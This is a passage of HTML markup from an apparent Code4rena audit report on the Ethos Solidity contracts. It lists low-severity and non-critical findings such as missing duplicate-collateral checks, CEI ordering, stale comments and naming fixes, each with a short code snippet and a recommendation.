class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MIN_ALLOWED_CCR</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// 150%</span></span></span></code></pre>\n<p>Consider having custom values per collateral</p>\n<h3 id=\"43-r---no-check-unique\" style=\"position:relative;\"><a href=\"#43-r---no-check-unique\" aria-label=\"43 r   no check unique permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>4.3. R - No check unique</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/CollateralConfig.sol#L53-L57\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/CollateralConfig.sol#L53-L57</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_MCRs</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_collaterals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Array lengths must match&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_CCRs</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_collaterals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Array lenghts must match&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_collaterals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_collaterals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p>The lack of validation allows to input the same collateral twice, causing unintended behavior</p>\n<h2 id=\"5-borroweroperations\" style=\"position:relative;\"><a href=\"#5-borroweroperations\" aria-label=\"5 borroweroperations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>5. BorrowerOperations</h2>\n<h3 id=\"51-r---partially-non-cei-conformant\" style=\"position:relative;\"><a href=\"#51-r---partially-non-cei-conformant\" aria-label=\"51 r   partially non cei conformant permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>5.1. R - Partially non-CEI conformant</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L231-L232\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L231-L232</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_collAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Since all other calls are from a verified contract, but collateral is not, the code could be refactored to transfer collateral directly to the active pool, as the last operation as to reduce any potential risk.</p>\n<h3 id=\"52-nc---function-is-called-withdraw-but-it-issues-new-tokens\" style=\"position:relative;\"><a href=\"#52-nc---function-is-called-withdraw-but-it-issues-new-tokens\" aria-label=\"52 nc   function is called withdraw but it issues new tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>5.2. NC - Function is called withdraw, but it issues new tokens</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L235\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L235</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">_withdrawLUSD</span></span></span></code></pre>\n<p>Consider renaming it</p>\n<h3 id=\"53-nc---can-xor\" style=\"position:relative;\"><a href=\"#53-nc---can-xor\" aria-label=\"53 nc   can xor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>5.3. NC - Can XOR</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L296-L297\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L296-L297</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_requireSingularCollChange</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collTopUp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collWithdrawal</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_requireNonZeroAdjustment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collTopUp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collWithdrawal</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_LUSDChange</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>For these two functions, instead of chaning <code>||</code> and having two functions, you could use a <code>XOR</code> to combine both.</p>\n<h2 id=\"6-activepool\" style=\"position:relative;\"><a href=\"#6-activepool\" aria-label=\"6 activepool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>6. ActivePool</h2>\n<h3 id=\"61-r---using-hardcoded-value-instead-of-a-constant\" style=\"position:relative;\"><a href=\"#61-r---using-hardcoded-value-instead-of-a-constant\" aria-label=\"61 r   using hardcoded value instead of a constant permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>6.1. R - Using hardcoded value instead of a constant</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L258\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L258</a></p>\n<p><code>10_000</code> could be turned into a <code>MAX_BPS</code> constant to improve refactoring and redability</p>\n<h3 id=\"62-r---approve-is-fine-as-it-cannot-be-front-run\" style=\"position:relative;\"><a href=\"#62-r---approve-is-fine-as-it-cannot-be-front-run\" aria-label=\"62 r   approve is fine as it cannot be front run permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>6.2. R - Approve is fine as it cannot be front-run</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L279-L280\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L279-L280</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">], </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">netAssetMovement</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<h3 id=\"63-nc---old-comment-around-borrowing-fee\" style=\"position:relative;\"><a href=\"#63-nc---old-comment-around-borrowing-fee\" aria-label=\"63 nc   old comment around borrowing fee permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>6.3. NC - Old comment around borrowing fee</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L195-L196\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L195-L196</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ICR is based on the composite debt, i.e. the requested LUSD amount + LUSD borrowing fee + LUSD gas comp.</span></span></span></code></pre>\n<p>There’s no borrowing fee, only gas compensation, consider deleting the comment</p>\n<h2 id=\"7-communityissuance\" style=\"position:relative;\"><a href=\"#7-communityissuance\" aria-label=\"7 communityissuance permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>7. CommunityIssuance</h2>\n<h3 id=\"71-l---right-after-deployment-this-check-will-be-true\" style=\"position:relative;\"><a href=\"#71-l---right-after-deployment-this-check-will-be-true\" aria-label=\"71 l   right after deployment this check will be true permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>7.1. L - Right after deployment this check will be true</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/CommunityIssuance.sol#L86-L87\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/CommunityIssuance.sol#L86-L87</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">lastIssuanceTimestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">lastDistributionTime</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p>Because <code>lastIssuanceTimestamp</code> will be 0</p>\n<h3 id=\"72-r---cei-confirmity\" style=\"position:relative;\"><a href=\"#72-r---cei-confirmity\" aria-label=\"72 r   cei confirmity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>7.2. R - CEI Confirmity</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/CommunityIssuance.sol#L103-L104\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/CommunityIssuance.sol#L103-L104</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">OathToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>To conform to CEI, you could simply edit the function to perform the transfer at the end</p>\n<h3 id=\"73-nc---comments-looks-out-of-place\" style=\"position:relative;\"><a href=\"#73-nc---comments-looks-out-of-place\" aria-label=\"73 nc   comments looks out of place permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>7.3. NC - Comments looks out of place</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/CommunityIssuance.sol#L23-L36\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/CommunityIssuance.sol#L23-L36</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">/* The issuance factor F determines the curvature of the issuance curve.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    * Minutes in one year: 60*24*365 = 525600</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    * For 50% of remaining tokens issued each year, with minutes as time units, we have:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    * </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    * F ** 525600 = 0.5</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    * </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    * Re-arranging:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    * </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    * 525600 * ln(F) = ln(0.5)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    * F = 0.5 ** (1/525600)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    * F = 0.999998681227695000 </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    */</span></span></span></code></pre>\n<p>This comment seems to be from liquity and should be deleted</p>\n<h3 id=\"74-nc---capitalization-looks-off\" style=\"position:relative;\"><a href=\"#74-nc---capitalization-looks-off\" aria-label=\"74 nc   capitalization looks off permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>7.4. NC - Capitalization looks off</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/CommunityIssuance.sol#L37-L38\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/CommunityIssuance.sol#L37-L38</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">OathToken</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Can change to: <code>oathToken</code></p>\n<h2 id=\"8-price-feed\" style=\"position:relative;\"><a href=\"#8-price-feed\" aria-label=\"8 price feed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>8. Price Feed</h2>\n<h3 id=\"l---the-tellor-fix-requires-constant-monitoring\" style=\"position:relative;\"><a href=\"#l---the-tellor-fix-requires-constant-monitoring\" aria-label=\"l   the tellor fix requires constant monitoring permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>L - The Tellor fix requires constant monitoring</h3>\n<p><code>TellorCaller</code> was modified to have a 20 minute delay on the value that is being recorded:</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/Dependencies/TellorCaller.sol#L44\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/Dependencies/TellorCaller.sol#L44</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" 